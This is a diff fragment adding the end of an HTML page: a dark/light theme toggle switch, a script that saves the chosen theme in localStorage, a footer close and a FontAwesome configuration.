+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
